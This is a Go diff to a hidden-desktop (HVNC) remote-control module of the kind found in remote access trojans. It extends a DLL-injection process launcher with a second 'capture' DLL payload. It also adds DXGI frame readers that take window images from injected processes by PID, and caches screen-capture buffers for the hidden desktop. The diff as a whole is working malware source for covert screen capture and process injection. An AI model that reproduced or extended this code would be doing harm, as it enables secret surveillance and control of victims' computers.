@@ -203,20 +203,21 @@ const (
 )
 
 type hvncTask struct {
-	kind        hvncTaskKind
-	id          uint64
-	display     int
-	filePath    string
-	x           int32
-	y           int32
-	button      int
-	vk          uint16
-	delta       int32
-	dllBytes    []byte
-	searchPath  string
-	replacePath string
-	queuedAt    time.Time
-	resp        chan hvncTaskResult
+	kind            hvncTaskKind
+	id              uint64
+	display         int
+	filePath        string
+	x               int32
+	y               int32
+	button          int
+	vk              uint16
+	delta           int32
+	dllBytes        []byte
+	captureDllBytes []byte
+	searchPath      string
+	replacePath     string
+	queuedAt        time.Time
+	resp            chan hvncTaskResult
 }
 
 type hvncTaskResult struct {
@@ -360,6 +361,10 @@ func CleanupHVNCDesktop() {
 	hvncDesktopMu.Lock()
 	defer hvncDesktopMu.Unlock()
 
+	hvncCleanupFrameReaders()
+
+	hvncFreeCapCache()
+
 	for _, entry := range hvncWinCache {
 		hvncFreeCacheEntry(entry)
 	}
@@ -475,7 +480,7 @@ func ensureHVNCThread() error {
 				case hvncTaskStartProcess:
 					result.err = startHVNCProcessOnThread(task.filePath)
 				case hvncTaskStartProcessInjected:
-					result.err = startHVNCProcessInjectedOnThread(task.filePath, task.dllBytes, task.searchPath, task.replacePath)
+					result.err = startHVNCProcessInjectedOnThread(task.filePath, task.dllBytes, task.captureDllBytes, task.searchPath, task.replacePath)
 				case hvncTaskMouseMove:
 					result.err = hvncMouseMoveOnThread(task.display, task.x, task.y)
 				case hvncTaskMouseDown:
@@ -710,12 +715,85 @@ func hvncTaskDetails(task hvncTask) string {
 	}
 }
 
+var (
+	hvncCapHDCScreen uintptr
+	hvncCapHDCMem    uintptr
+	hvncCapHBMP      uintptr
+	hvncCapBits      unsafe.Pointer
+	hvncCapW         int
+	hvncCapH         int
+	hvncCapImg       *image.RGBA
+)
+
+func hvncFreeCapCache() {
+	if hvncCapHBMP != 0 {
+		deleteObject(hvncCapHBMP)
+		hvncCapHBMP = 0
+	}
+	if hvncCapHDCMem != 0 {
+		deleteDC(hvncCapHDCMem)
+		hvncCapHDCMem = 0
+	}
+	if hvncCapHDCScreen != 0 {
+		releaseDC(0, hvncCapHDCScreen)
+		hvncCapHDCScreen = 0
+	}
+	hvncCapBits = nil
+	hvncCapW = 0
+	hvncCapH = 0
+	hvncCapImg = nil
+}
+
+func hvncEnsureCapCache(w, h int) (uintptr, uintptr, []byte, bool) {
+	if hvncCapHDCScreen == 0 {
+		hvncCapHDCScreen = getDC(0)
+		if hvncCapHDCScreen == 0 {
+			return 0, 0, nil, false
+		}
+	}
+	if hvncCapHDCMem != 0 && hvncCapW == w && hvncCapH == h && hvncCapBits != nil {
+		buf := unsafe.Slice((*byte)(hvncCapBits), w*h*4)
+		return hvncCapHDCScreen, hvncCapHDCMem, buf, true
+	}
+	if hvncCapHBMP != 0 {
+		deleteObject(hvncCapHBMP)
+		hvncCapHBMP = 0
+	}
+	if hvncCapHDCMem != 0 {
+		deleteDC(hvncCapHDCMem)
+		hvncCapHDCMem = 0
+	}
+	hvncCapHDCMem = createCompatibleDC(hvncCapHDCScreen)
+	if hvncCapHDCMem == 0 {
+		return 0, 0, nil, false
+	}
+	bmi := bitmapInfo{
+		bmiHeader: bitmapInfoHeader{
+			biSize:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
+			biWidth:       int32(w),
+			biHeight:      -int32(h),
+			biPlanes:      1,
+			biBitCount:    32,
+			biCompression: BI_RGB,
+		},
+	}
+	hvncCapHBMP = createDIBSection(hvncCapHDCMem, &bmi, DIB_RGB_COLORS, &hvncCapBits)
+	if hvncCapHBMP == 0 || hvncCapBits == nil {
+		deleteDC(hvncCapHDCMem)
+		hvncCapHDCMem = 0
+		return 0, 0, nil, false
+	}
+	selectObject(hvncCapHDCMem, hvncCapHBMP)
+	hvncCapW = w
+	hvncCapH = h
+	hvncCapImg = nil
+	buf := unsafe.Slice((*byte)(hvncCapBits), w*h*4)
+	return hvncCapHDCScreen, hvncCapHDCMem, buf, true
+}
+
 func hvncCaptureDisplayOnThread(display int) (*image.RGBA, error) {
 	captureMu.Lock()
 	defer captureMu.Unlock()
-
-	restoreRes := BypassResolutionCap()
-	defer restoreRes()
 
 	setDPIAware()
 
@@ -748,36 +826,11 @@ func hvncCaptureDisplayOnThread(display int) (*image.RGBA, error) {
 	capW := srcW
 	capH := srcH
 
-	hdcScreen := getDC(0)
-	if hdcScreen == 0 {
+	hdcScreen, hdcMem, buf, ok := hvncEnsureCapCache(capW, capH)
+	if !ok {
 		return nil, syscall.EINVAL
 	}
-	defer releaseDC(0, hdcScreen)
 
-	hdcMem := createCompatibleDC(hdcScreen)
-	if hdcMem == 0 {
-		return nil, syscall.EINVAL
-	}
-	defer deleteDC(hdcMem)
-
-	bmi := bitmapInfo{
-		bmiHeader: bitmapInfoHeader{
-			biSize:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
-			biWidth:       int32(capW),
-			biHeight:      -int32(capH),
-			biPlanes:      1,
-			biBitCount:    32,
-			biCompression: BI_RGB,
-		},
-	}
-	var bits unsafe.Pointer
-	hbmp := createDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, &bits)
-	if hbmp == 0 || bits == nil {
-		return nil, syscall.EINVAL
-	}
-	selectObject(hdcMem, hbmp)
-
-	buf := unsafe.Slice((*byte)(bits), capW*capH*4)
 	for i := range buf {
 		buf[i] = 0
 	}
@@ -792,14 +845,15 @@ func hvncCaptureDisplayOnThread(display int) (*image.RGBA, error) {
 	}
 
 	swapRB(buf)
-	img := image.NewRGBA(image.Rect(0, 0, capW, capH))
+
+	img := hvncCapImg
+	if img == nil || img.Bounds().Dx() != capW || img.Bounds().Dy() != capH {
+		img = image.NewRGBA(image.Rect(0, 0, capW, capH))
+		hvncCapImg = img
+	}
 	copy(img.Pix, buf)
 
-	deleteObject(hbmp)
-
-	if hvncCursorEnabled {
-		DrawCursorOnImage(img, bounds)
-	}
+	_ = hdcMem
 
 	if dstW != capW || dstH != capH {
 		img = resizeNearest(img, dstW, dstH)
@@ -1571,6 +1625,95 @@ func hvncFreeCacheEntry(entry *hvncWinCacheEntry) {
 	}
 }
 
+var dxgiFrameBuf []byte
+
+var hvncDXGIEnabled atomic.Bool
+
+func init() {
+	hvncDXGIEnabled.Store(true) // enabled by default
+}
+
+func SetHVNCDXGIEnabled(enabled bool) {
+	hvncDXGIEnabled.Store(enabled)
+}
+
+func GetHVNCDXGIEnabled() bool {
+	return hvncDXGIEnabled.Load()
+}
+
+func drawHVNCWindowFromDXGI(hwnd uintptr, winLeft, winTop, winW, winH int, bounds image.Rectangle, target []byte, targetStride int) bool {
+	if !hvncDXGIEnabled.Load() {
+		return false
+	}
+	var pid uint32
+	procGetWindowThreadProcessId.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
+	if pid == 0 {
+		return false
+	}
+
+	reader := hvncGetFrameReader(pid)
+	if reader == nil {
+		hvncFrameReadersMu.Lock()
+		gpuPID := hvncGPUPIDMap[pid]
+		hvncFrameReadersMu.Unlock()
+		if gpuPID != 0 {
+			reader = hvncGetFrameReader(gpuPID)
+		}
+	}
+	if reader == nil {
+		return false
+	}
+
+	needed := winW * winH * 4
+	if cap(dxgiFrameBuf) < needed {
+		dxgiFrameBuf = make([]byte, needed)
+	}
+	buf := dxgiFrameBuf[:needed]
+
+	frameW, frameH, ok := reader.readFrame(buf)
+	if !ok {
+		return false
+	}
+
+	copyW := minInt(winW, frameW)
+	copyH := minInt(winH, frameH)
+	if copyW <= 0 || copyH <= 0 {
+		return false
+	}
+
+	srcStride := frameW * 4
+	winStride := winW * 4
+
+	effWinLeft := winLeft
+	effWinTop := winTop
+	effWinRight := winLeft + copyW
+	effWinBottom := winTop + copyH
+
+	interLeft := maxInt(effWinLeft, bounds.Min.X)
+	interTop := maxInt(effWinTop, bounds.Min.Y)
+	interRight := minInt(effWinRight, bounds.Max.X)
+	interBottom := minInt(effWinBottom, bounds.Max.Y)
+	if interRight <= interLeft || interBottom <= interTop {
+		return false
+	}
+
+	srcX := interLeft - winLeft
+	srcY := interTop - winTop
+	dstX := interLeft - bounds.Min.X
+	dstY := interTop - bounds.Min.Y
+	blitW := interRight - interLeft
+	blitH := interBottom - interTop
+
+	for y := 0; y < blitH; y++ {
+		srcStart := (srcY+y)*srcStride + srcX*4
+		dstStart := (dstY+y)*targetStride + dstX*4
+		copy(target[dstStart:dstStart+blitW*4], buf[srcStart:srcStart+blitW*4])
+	}
+
+	_ = winStride
+	return true
+}
+
 func drawHVNCWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target []byte, targetStride int) bool {
 	if !isWindowVisible(hwnd) {
 		return false
@@ -1595,6 +1738,10 @@ func drawHVNCWindow(hdcScreen, hwnd uintptr, bounds image.Rectangle, target []by
 	winH := winBottom - winTop
 	if winW <= 0 || winH <= 0 {
 		return false
+	}
+
+	if drawn := drawHVNCWindowFromDXGI(hwnd, winLeft, winTop, winW, winH, bounds, target, targetStride); drawn {
+		return true
 	}
 
 	// Use pooled DC+DIB from cache
